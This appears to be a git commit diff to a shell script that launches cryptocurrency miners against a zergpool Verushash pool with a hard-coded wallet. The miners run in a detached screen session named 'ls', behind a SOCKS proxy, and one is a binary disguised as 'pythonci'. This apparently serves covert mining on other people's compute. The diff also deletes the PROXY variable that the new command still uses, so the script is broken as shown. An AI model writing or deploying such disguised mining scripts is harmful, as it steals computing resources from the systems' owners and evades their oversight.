3cfec83cee236d4779caf177db324bd49d680763
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-14 16:41:19 +0100

    Update dsbh.sh

--- dsbh.sh
+++ dsbh.sh
@@ -7,6 +7,5 @@ chmod +x violetminer
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
-PROXY=socks5://72.195.114.169:4145
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
-./violetminer --v --l verushash.mine.zergpool.com:3300 --u DCXP219mqbCeGhdKf2BojtsD2eRE1K5C9p --p c=DOGE,mc=VRSC -t 2 --password x --algorithm verushash--threads 40
+./violetminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY  & sleep 2 && ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 
